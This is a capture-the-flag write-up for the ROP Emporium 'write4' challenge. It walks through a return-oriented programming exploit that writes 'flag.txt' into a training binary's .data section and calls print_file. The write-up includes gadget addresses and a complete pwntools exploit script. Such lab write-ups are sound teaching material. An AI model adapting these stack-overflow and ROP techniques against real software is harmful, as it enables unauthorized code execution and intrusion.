# ROP Emporium | write4 Writeup

## Notes from Challenge Description

On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string "/bin/cat flag.txt" is not present this time. Although you'll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we'll stick to the challenge goal which is learning how to get data into the target process's virtual address space via the magic of ROP.

**Important:** A PLT entry for a function named `print_file()` exists within the challenge binary. Simply call it with the name of a file you wish to read (like `"flag.txt"`) as the first argument.

---

## Understanding the Setup

The interesting part here is that `pwnme()` is an external function here—not that it matters—we're still using the same process to overwrite the return address and redirect execution to `usefulFunction`. If you want to take a look at `pwnme()`, you can check out the disassembly of `libwrite4.so` included in the challenge zip.

### usefulFunction():

![usefu](/Screenshots/usful.png)

From the function and the challenge description, we can see that a string is moved to `edi` (1st argument) and then `print_file()` is called.

We know the location of `print_file()` from the PLT section:

```asm
print_file();
0x00400510      jmp     qword [print_file] ; 0x601020
0x00400516      push    1          ; 1
0x0040051b      jmp     section..plt
```

So our goal is to move the string `"flag.txt"` into the `rdi` register and call the `print_file()` function.

---

## Strategy: Writing to Memory

We can't pass the string directly into `rdi`. We need to write the string into `.data` or `.bss` sections, as those parts of the binary are writable during runtime.

We're given a hint on how to do this in a section called `UsefulGadgets`.

![usefu](/Screenshots/usegadg.png)

One useful gadget is:

```asm
mov [r14], r15 ; ret
```

If there's an address stored in `r14`, and data in `r15`, this gadget writes the data to the address stored in `r14`. Since we want to write to `.data`, we can store its address in `r14`. To set that up, we need gadgets to `pop r14` and `pop r15`, and another one to `pop rdi`.

### Gadget Locations (via ROPgadget):

```python
g1 = p64(0x0000000000400693) # pop rdi ; ret
g2 = p64(0x0000000000400690) # pop r14 ; pop r15 ; ret
g3 = p64(0x0000000000400628) # mov qword ptr [r14], r15 ; ret
```

### Finding .data Section:

Using Cutter, we search and find:

```asm
;-- section..data:
;-- .data:
;-- data_start:
;-- __data_start:
0x00601028      add     byte [rax], al ; [22] -rw- section size 16 named .data
```

So we use:

```python
r14 = p64(0x00601028)
```

---

## Formatting the String

```python
str = b"flag.txt".ljust(8, b'\x00')
str_pack = p64(u64(str))
```

The `.ljust(8, b'\x00')` ensures that if the string is less than 8 bytes, it adds null padding. Then our string is converted to an unsigned int using `u64()`, and then back into bytes using `p64()`.

Luckily, our string is exactly 8 bytes. If it were longer, we'd need to chunk it across multiple addresses, which is trickier and left for a future writeup.

---

## Final Payload

```python
from pwn import *

junk = b'A' * 40
str = b"flag.txt".ljust(8, b'\x00')
str_pack = p64(u64(str))

g1 = p64(0x0000000000400693) # pop rdi ; ret
g2 = p64(0x0000000000400690) # pop r14 ; pop r15 ; ret
g3 = p64(0x0000000000400628) # mov qword ptr [r14], r15 ; ret

data_section = p64(0x00601028)
print_file = p64(0x00400510)

payload = junk + g2 + data_section + str_pack + g3 + g1 + data_section + print_file

p = process('./write4')

p.recvuntil('>')
p.sendline(payload)
p.interactive()
```

---

## Step-by-step ROP:

1. **pop r14 ; pop r15 ; ret**
   → r14 = .data section address
   → r15 = "flag.txt" (as 8-byte integer)

2. **mov \[r14], r15 ; ret**
   → Writes "flag.txt" into .data

3. **pop rdi ; ret**
   → rdi = .data (address of our string)

4. **call print\_file()**
   → Displays contents of flag.txt

---
---

![final](/Screenshots/final.png)

## Final Thoughts

Although the ending payload was relatively short and the core trick revolved around a single write, this challenge made me more comfortable using ROP to move data into memory and call functions with controlled arguments. I needed help along the way, but the learning was rewarding and the satisfaction of seeing the flag print out was great. I'm excited to try challenges that require writing longer strings next!
